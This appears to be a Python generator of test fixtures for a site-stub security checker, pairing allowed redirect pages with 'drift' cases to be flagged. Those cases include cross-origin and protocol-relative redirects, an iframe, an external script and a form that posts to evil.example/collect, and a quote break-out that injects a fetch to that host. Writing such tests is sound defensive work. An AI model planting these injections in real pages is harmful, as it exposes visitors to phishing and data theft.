# C14 redirect-stub rooms and C15 extra noShell cases. Run from this folder: python3 mk6.py
import sys; sys.path.insert(0, '../adv4')
exec(open('../adv4/mk4.py').read().split('# noShell')[0])
MARK = '<!-- subx-nest-stub: generated by nest_stubs.py; edit site.json, not this file -->'
# the inline <script> body nest_stubs.py writes (only the slug differs between nests)
TPL = ("\n    (function () {\n"
       "      var path = location.pathname || '/%s';\n"
       "      if (path.charAt(0) !== '/') path = '/' + path;\n"
       "      path = path.replace(/\\.html$/, '');\n"
       "      try { sessionStorage.setItem('subx.restorePath', path + (location.search || '') + (location.hash || '')); } catch (e) {}\n"
       "      location.replace('/' + (location.search || '') + (location.hash || ''));\n"
       "    })();\n  ")
FETCH = TPL.replace("      location.replace(", "      fetch('/api/visit?p=' + encodeURIComponent(path));\n      location.replace(")


def stub(slug, script=None, head='', body=''):
    return ('<!DOCTYPE html>\n%s\n<html lang="en">\n<head>\n  <meta charset="UTF-8">\n  <title>%s</title>\n'
            '  <link rel="canonical" href="https://room.example/%s">\n%s  <script>%s</script>\n</head>\n<body>\n'
            '  <main><h1>%s</h1><p><a href="/">Open room</a></p></main>\n%s</body>\n</html>\n'
            % (MARK, slug, slug, head, TPL % slug if script is None else script, slug, body))


def bare(target):
    return ('<!DOCTYPE html>\n<html lang="en">\n<head>\n  <meta charset="utf-8">\n  <meta http-equiv="refresh" content="0;url=/#explore">\n'
            "  <script>location.replace('%s');</script>\n</head>\n<body><p><a href=\"/#explore\">Continue</a></p></body>\n</html>\n" % target)


# OK: generated nest stubs and a bare same-origin bounce need neither noShell nor an inline hash
mk('s0_stubs_ok', PIN, {}, None, {'boston.html': stub('boston'), 'palo-alto.html': stub('palo-alto'), 'explore.html': bare('/#explore')})
mk('s1_redirects_declared', PIN, {'redirects': ['go.html']}, None, {'go.html': bare('/')})
# DRIFT: near-template stub with an added fetch
mk('s2_near_template_fetch', PIN, {}, None, {'boston.html': stub('boston', FETCH % 'boston')})
# DRIFT: cross-origin redirect (bare, and declared in shell.redirects)
mk('s3_cross_origin', PIN, {}, None, {'go.html': bare('https://evil.example/')})
mk('s3b_cross_origin_declared', PIN, {'redirects': ['go.html']}, None, {'go.html': bare('https://evil.example/')})
# DRIFT: template stub plus an extra inline script / an on* handler / an iframe / a form / an external script
mk('s4_extra_inline', PIN, {}, None, {'boston.html': stub('boston', head='  <script>window.x = 1;</script>\n')})
mk('s5_handler', PIN, {}, None, {'boston.html': stub('boston', body='  <img src="x.png" onerror="window.x=1">\n')})
mk('s6_iframe', PIN, {}, None, {'boston.html': stub('boston', body='  <iframe src="https://evil.example/frame.html"></iframe>\n')})
mk('s7_form', PIN, {}, None, {'boston.html': stub('boston', body='  <form action="https://evil.example/collect" method="post"><input name="q"></form>\n')})
mk('s8_external_script', PIN, {}, None, {'boston.html': stub('boston', head='  <script src="https://evil.example/x.js"></script>\n')})
# DRIFT: protocol-relative redirect (//host and the /\host form browsers treat the same way), and a protocol-relative meta refresh
mk('s9_protocol_relative', PIN, {}, None, {'go.html': bare('//evil.example/')})
mk('s9b_backslash', PIN, {}, None, {'go.html': bare('/\\\\evil.example/')})
mk('s9c_refresh_protocol_relative', PIN, {}, None, {'boston.html': stub('boston', head='  <meta http-equiv="refresh" content="0;url=//evil.example/">\n')})
# DRIFT: template with a non-slug path literal (quote break-out) and a declared redirect that is not a stub
mk('s10_slug_breakout', PIN, {}, None, {'boston.html': stub('boston', TPL % "x'+fetch('//evil.example')+'")})
mk('s11_redirects_not_stub', PIN, {'redirects': ['terms.html']}, None, {'terms.html': '<html><body><p>Terms</p></body></html>'})
# C15: Firebase-host import on a noShell page via a dynamic import with "injects" declared, and via an npm CDN
DYNFB = "import('https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js').then(function (m) { m.initializeApp({}); });"
ESMFB = "import {initializeApp} from 'https://esm.sh/firebase@10.12.2/app';initializeApp({});"
mk('f1_noshell_dyn_firebase', PIN, {'noShell': ['terms.html'], 'overrides': {'inline': [{'page': 'terms.html', 'sha256': sha(DYNFB), 'reason': 't', 'injects': 'sdk'}]}},
   None, {'terms.html': '<html><script>' + DYNFB + '</script></html>'})
mk('f2_noshell_esm_firebase', PIN, {'noShell': ['terms.html'], 'overrides': {'inline': [{'page': 'terms.html', 'sha256': sha(ESMFB), 'reason': 't', 'imports': ['https://esm.sh/firebase@10.12.2/app']}]}},
   None, {'terms.html': '<html><script type="module">' + ESMFB + '</script></html>'})
